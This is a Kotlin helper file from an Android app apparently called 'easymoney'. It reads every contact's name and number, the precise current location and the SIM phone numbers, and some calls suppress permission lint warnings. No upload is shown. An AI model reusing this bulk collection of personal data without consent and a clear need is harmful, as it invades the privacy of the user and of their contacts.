package com.tech.easymoney.utils

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.provider.ContactsContract
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import com.tech.easymoney.data.model.ContactInfo
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority

object DeviceDataHelper {

    @SuppressLint("Range")
    fun getContacts(context: Context): List<ContactInfo> {
        val contactList = mutableListOf<ContactInfo>()
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "Unknown"
                contactList.add(ContactInfo(name, number))
            }
        }
        return contactList
    }

    @SuppressLint("MissingPermission")
    fun getLastKnownLocation(context: Context, callback: (String) -> Unit) {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
        fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
            .addOnSuccessListener { location ->
                if (location != null) {
                    callback("Lat: ${location.latitude}, Lon: ${location.longitude}")
                } else {
                    callback("Location not available")
                }
            }
            .addOnFailureListener {
                callback("Error: ${it.message}")
            }
    }

    @SuppressLint("MissingPermission")
    fun getSimDetails(context: Context): List<String> {
        val simDetailsList = mutableListOf<String>()
        val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
        val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList

        if (activeSubscriptions.isNullOrEmpty()) {
            simDetailsList.add("No SIM inserted")
        } else {
            activeSubscriptions.forEachIndexed { index, info ->
                val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    subscriptionManager.getPhoneNumber(info.subscriptionId) ?: "Unknown"
                } else {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                    telephonyManager.createForSubscriptionId(info.subscriptionId).line1Number ?: "Unknown"
                }
                simDetailsList.add("SIM ${index + 1}: $number")
            }
        }
        return simDetailsList
    }
}
